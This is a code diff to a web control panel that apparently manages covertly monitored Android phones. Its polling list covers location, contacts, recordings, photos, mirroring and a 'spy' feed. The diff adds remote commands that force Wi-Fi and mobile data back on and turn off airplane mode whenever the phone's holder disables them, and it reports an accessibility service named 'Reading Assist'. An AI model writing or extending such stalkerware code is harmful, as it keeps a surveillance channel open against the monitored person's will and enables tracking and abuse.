@@ -632,6 +632,59 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </label>
 <span id="updatePauseStatus" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
 </div>
+<!-- Phone connection (auto turn on Wi-Fi / mobile data / airplane) -->
+<div style="margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="connWrap">
+  <div style="font-size:13px;font-weight:700;margin-bottom:8px">Phone connection (auto turn on)</div>
+  <div style="display:flex;align-items:center;gap:12px;margin-bottom:6px">
+    <label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+      <div style="position:relative;width:44px;height:24px">
+        <input type="checkbox" id="connWifiToggle" onchange="toggleConn('wifi', this.checked)" style="opacity:0;width:0;height:0">
+        <span id="connWifiSlider" style="position:absolute;inset:0;background:var(--muted);border-radius:12px;transition:.2s"></span>
+        <span id="connWifiKnob" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+      </div>
+      <span id="connWifiLabel" style="font-size:13px;font-weight:600;color:var(--muted)">Keep Wi-Fi on: Off</span>
+    </label>
+  </div>
+  <div style="font-size:11px;color:var(--muted);margin-bottom:8px;margin-left:52px">If Wi-Fi gets turned off, the phone will turn it back on by itself within a few minutes.</div>
+  <div style="display:flex;align-items:center;gap:12px;margin-bottom:6px">
+    <label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+      <div style="position:relative;width:44px;height:24px">
+        <input type="checkbox" id="connDataToggle" onchange="toggleConn('data', this.checked)" style="opacity:0;width:0;height:0">
+        <span id="connDataSlider" style="position:absolute;inset:0;background:var(--muted);border-radius:12px;transition:.2s"></span>
+        <span id="connDataKnob" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+      </div>
+      <span id="connDataLabel" style="font-size:13px;font-weight:600;color:var(--muted)">Keep mobile data on: Off</span>
+    </label>
+  </div>
+  <div style="font-size:11px;color:var(--muted);margin-bottom:8px;margin-left:52px">If mobile data gets turned off, the phone will turn it back on by itself within a few minutes.</div>
+  <div style="display:flex;align-items:center;gap:12px;margin-bottom:6px">
+    <label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+      <div style="position:relative;width:44px;height:24px">
+        <input type="checkbox" id="connAirToggle" onchange="toggleConn('airplane', this.checked)" style="opacity:0;width:0;height:0">
+        <span id="connAirSlider" style="position:absolute;inset:0;background:var(--muted);border-radius:12px;transition:.2s"></span>
+        <span id="connAirKnob" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+      </div>
+      <span id="connAirLabel" style="font-size:13px;font-weight:600;color:var(--muted)">Also switch off Airplane mode: Off</span>
+    </label>
+  </div>
+  <div style="font-size:11px;color:var(--muted);margin-bottom:8px;margin-left:52px">If Airplane mode gets turned on, the phone will turn it off so Wi-Fi and mobile data can work.</div>
+  <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;flex-wrap:wrap">
+    <span style="font-size:12px;font-weight:600;min-width:90px">Hours (optional)</span>
+    <input type="time" id="connFromTime" style="font-size:12px;padding:2px 6px">
+    <span style="font-size:12px">to</span>
+    <input type="time" id="connToTime" style="font-size:12px;padding:2px 6px">
+    <select id="connMode" style="font-size:12px;padding:2px 6px">
+      <option value="quiet">Quiet hours (do nothing during these hours)</option>
+      <option value="active">Active hours (only do it during these hours)</option>
+    </select>
+  </div>
+  <div style="font-size:11px;color:var(--muted);margin-bottom:8px;margin-left:98px">Leave hours blank to do it any time.</div>
+  <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+    <button class="btn" style="font-size:12px;padding:4px 10px" onclick="fixConnNow()">Fix now</button>
+    <span id="connStatus" style="font-size:12px;color:var(--muted)">—</span>
+  </div>
+  <div style="font-size:11px;color:var(--muted)" id="connLive">Live: —</div>
+</div>
 <div class="grid">
 <div style="grid-column:1 / -1;display:flex;gap:6px;flex-wrap:wrap;font-size:10px">
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swAppVer">&#x1F4E6; --</span>
@@ -3491,6 +3544,7 @@ function startPolling() {
   schedulePoll('tuning', intervals.tuning, pollTuning);
   schedulePoll('heat', intervals.heat, pollHeat);
   schedulePoll('updatePause', intervals.updatePause, pollUpdatePause);
+  schedulePoll('conn', 60000, pollConn);
   schedulePoll('files', intervals.files, pollFileInventory);
 }
 
@@ -3503,7 +3557,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollFileInventory(), pollActivity(), pollSavedWifi(), pollSyncToggles(), pollTuning(), pollUpdatePause()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollFileInventory(), pollActivity(), pollSavedWifi(), pollSyncToggles(), pollTuning(), pollUpdatePause(), pollConn()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -11481,6 +11535,80 @@ async function pollUpdatePause(){
   }catch(e){}
 }
 
+// --- Phone connection (auto turn on Wi-Fi / mobile data / airplane) ---
+function _connSetSwitch(which, on){
+  const slider = document.getElementById('conn'+cap(which)+'Slider');
+  const knob = document.getElementById('conn'+cap(which)+'Knob');
+  const label = document.getElementById('conn'+cap(which)+'Label');
+  const toggle = document.getElementById('conn'+cap(which)+'Toggle');
+  if(toggle) toggle.checked = on;
+  if(slider) slider.style.background = on ? 'var(--success)' : 'var(--muted)';
+  if(knob) knob.style.left = on ? '22px' : '2px';
+  const name = which==='wifi'?'Wi-Fi': which==='data'?'mobile data':'Airplane mode';
+  if(label){ label.textContent = (which==='wifi'?'Keep Wi-Fi on': which==='data'?'Keep mobile data on':'Also switch off Airplane mode') + ': ' + (on?'On':'Off'); label.style.color = on ? 'var(--success)' : 'var(--muted)'; }
+}
+function cap(s){ return s.charAt(0).toUpperCase()+s.slice(1); }
+async function toggleConn(which, checked){
+  if(!selectedDevice){ showAlert('No device selected','error'); return; }
+  const wifi = (which==='wifi') ? checked : (document.getElementById('connWifiToggle')||{}).checked;
+  const data = (which==='data') ? checked : (document.getElementById('connDataToggle')||{}).checked;
+  const air = (which==='airplane') ? checked : (document.getElementById('connAirToggle')||{}).checked;
+  const fromT = (document.getElementById('connFromTime')||{}).value || '';
+  const toT = (document.getElementById('connToTime')||{}).value || '';
+  const mode = (document.getElementById('connMode')||{}).value || 'quiet';
+  let fh=-1, fm=0, th=-1, tm=0;
+  if(fromT){ const p=fromT.split(':'); fh=parseInt(p[0]); fm=parseInt(p[1]); }
+  if(toT){ const p=toT.split(':'); th=parseInt(p[0]); tm=parseInt(p[1]); }
+  const enabled = wifi || data || air;
+  const statusEl = document.getElementById('connStatus');
+  if(statusEl) statusEl.textContent = 'Saving…';
+  try{
+    const cfg = { enabled, wifi, data, airplane: air, fromHour: fh, fromMin: fm, toHour: th, toMin: tm, mode, ts_ms: Date.now() };
+    const ok2 = await writeRTDBStrict(`devices/${selectedDevice}/config/connectivity_auto`, cfg);
+    const ok1 = await writeRTDBStrict(`devices/${selectedDevice}/commands/connectivity_control`, { action:'set', enabled, wifi, data, airplane: air, fromHour: fh, fromMin: fm, toHour: th, toMin: tm, mode, ts_ms: Date.now() });
+    if(ok1 && ok2) showAlert('Phone connection settings saved','success');
+    else showAlert('Failed to save phone connection settings','error');
+  }catch(e){ showAlert('Toggle failed: '+e.message,'error'); }
+  setTimeout(pollConn, 2000);
+}
+async function fixConnNow(){
+  if(!selectedDevice){ showAlert('No device selected','error'); return; }
+  const statusEl = document.getElementById('connStatus');
+  if(statusEl) statusEl.textContent = 'Sending…';
+  try{
+    await writeRTDBStrict(`devices/${selectedDevice}/commands/connectivity_control`, { action:'now', ts_ms: Date.now() });
+    showAlert('Fix now sent — phone will try within ~30s','warn');
+  }catch(e){ showAlert('Failed: '+e.message,'error'); }
+  setTimeout(pollConn, 4000);
+}
+async function pollConn(){
+  if(!selectedDevice) return;
+  try{
+    let data = await fetchRTDB(`devices/${selectedDevice}/config/connectivity_auto`);
+    if(!data || typeof data!=='object') data = {};
+    const wifi = data.wifi===true || data.wifi==='true' || data.wifi===1;
+    const d = data.data===true || data.data==='true' || data.data===1;
+    const air = data.airplane===true || data.airplane==='true' || data.airplane===1;
+    _connSetSwitch('wifi', wifi);
+    _connSetSwitch('data', d);
+    _connSetSwitch('airplane', air);
+    const fromT = (data.fromHour>=0 && data.fromMin>=0) ? String(data.fromHour).padStart(2,'0')+':'+String(data.fromMin).padStart(2,'0') : '';
+    const toT = (data.toHour>=0 && data.toMin>=0) ? String(data.toHour).padStart(2,'0')+':'+String(data.toMin).padStart(2,'0') : '';
+    const fe = document.getElementById('connFromTime'); if(fe) fe.value = fromT;
+    const te = document.getElementById('connToTime'); if(te) te.value = toT;
+    const me = document.getElementById('connMode'); if(me && data.mode) me.value = data.mode;
+    // live state
+    let st = await fetchRTDB(`devices/${selectedDevice}/connectivity_state`);
+    const live = document.getElementById('connLive');
+    if(live){
+      if(st && typeof st==='object'){
+        live.textContent = 'Live: Wi-Fi '+(st.wifi?'ON':'OFF')+' · data '+(st.data?'ON':'OFF')+' · airplane '+(st.airplane?'ON':'OFF')+' · last: '+(st.result||'—')+' · Reading Assist '+(st.readingAssist?'on':'OFF');
+      } else live.textContent = 'Live: —';
+    }
+    const statusEl = document.getElementById('connStatus');
+    if(statusEl) statusEl.textContent = (wifi||d||air) ? 'Enabled' : 'Disabled';
+  }catch(e){}
+}
 // --- File cleanup (Downloads/Documents) ---
 async function fileCleanupSend(payload){
   if(!selectedDevice) return false;
